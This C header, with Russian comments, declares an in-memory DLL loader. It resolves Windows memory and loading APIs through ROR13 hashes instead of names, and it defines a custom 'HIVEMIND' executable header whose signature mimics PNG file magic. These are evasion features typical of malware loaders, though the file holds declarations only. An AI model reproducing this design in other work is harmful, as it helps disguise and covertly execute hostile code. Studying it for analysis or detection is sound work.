#pragma once

#include <windows.h>

#define dwKernelHash 0x6e2bca17 // kernel32.dll
#define dwVirtualAllocHash 0x302ebe1c // VirtualAlloc
#define dwVirtualProtectHash 0x1803b7e3 // VirtualProtect
#define dwVirtualQueryHash 0x4247bc72 // VirtualQuery
#define dwVirtualFreeHash 0xe183277b // VirtualFree
#define dwFlushInstructionCache 0xd9303a47 // FlushInstructionCache
#define dwLoadLibraryAHash 0x8a8b4676 // LoadLibraryA
#define dwGetProcAddressHash 0x1acaee7a // GetProcAddress
#define dwFreeLibraryHash 0xecc6c96f // FreeLibrary
#define dwIsBadReadPtrHash 0xd803d0a // IsBadReadPtr
#define dwlstrcmpiAHash 0xe99c4eca // lstrcmpiA
#define dwOutputDebugStringAHash 0xd5e9949f // OutputDebugStringA

typedef SIZE_T(WINAPI *fn1)(SIZE_T);
typedef SIZE_T(WINAPI *fn2)(SIZE_T, SIZE_T);
typedef SIZE_T(WINAPI *fn3)(SIZE_T, SIZE_T, SIZE_T);
typedef SIZE_T(WINAPI *fn4)(SIZE_T, SIZE_T, SIZE_T, SIZE_T);
typedef SIZE_T(WINAPI *fn5)(SIZE_T, SIZE_T, SIZE_T, SIZE_T, SIZE_T);
typedef SIZE_T(WINAPI *fn6)(SIZE_T, SIZE_T, SIZE_T, SIZE_T, SIZE_T, SIZE_T);

// функции требуемые длл лоадеру
struct loader_functions
{
	fn4 _VirtualAlloc;
	fn4 _VirtualProtect;
	fn3 _VirtualQuery;
	fn3 _VirtualFree;
	fn3 _FlushInstructionCache;
	fn1 _LoadLibraryA;
	fn2 _GetProcAddress;
	fn1 _FreeLibrary;
	fn2 _IsBadReadPtr;
	fn2 _lstrcmpiA;
	fn1 _OutputDebugStringA;
};

typedef void *HMEMORYMODULE;

HMEMORYMODULE MemoryLoadLibrary(loader_functions *ctx, const void *);
FARPROC MemoryGetProcAddress(loader_functions *ctx, HMEMORYMODULE, const char *);
void MemoryFreeLibrary(loader_functions *ctx, HMEMORYMODULE);

HMEMORYMODULE BuildImport(loader_functions *ctx, PVOID ImageBase, BOOL bHiveExecutable);

DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string);
DWORD __stdcall ror13_hash(const char *string);
HMODULE __stdcall find_module_by_hash(DWORD hash);
FARPROC __stdcall find_function(HMODULE module, DWORD hash);
BOOL __stdcall resolve_functions(loader_functions *ctx);


#define IMAGE_HIVEMIND_SIGNATURE_PART1 0x474E5089
#define IMAGE_HIVEMIND_SIGNATURE_PART2 0xA1A0A0D
#define IMAGE_HIVEMIND_NT_SIGNATURE 0x0

#pragma pack(1)
typedef struct _IMAGE_HIVEMIND_HEADER
{
	DWORD dwHiveSign1;
	DWORD dwHiveSign2;
	LONG e_lfanew;
	// размер должен быть таким же, как и у IMAGE_DOS_HEADER
	unsigned char dummy[sizeof(IMAGE_DOS_HEADER) - 12];
} IMAGE_HIVEMIND_HEADER, *PIMAGE_HIVEMIND_HEADER;
#pragma pack()

#pragma pack(1)
typedef struct _IMAGE_HIVEMIND_NT_HEADER32
{
	DWORD Signature;
	IMAGE_FILE_HEADER FileHeader;
	IMAGE_OPTIONAL_HEADER32 OptionalHeader;
} IMAGE_HIVEMIND_NT_HEADER32, *PIMAGE_HIVEMIND_NT_HEADER32;
#pragma pack()

#pragma pack(1)
typedef struct _IMAGE_HIVEMIND_NT_HEADER64
{
	DWORD Signature;
	IMAGE_FILE_HEADER FileHeader;
	IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_HIVEMIND_NT_HEADER64, *PIMAGE_HIVEMIND_NT_HEADER64;
#pragma pack()
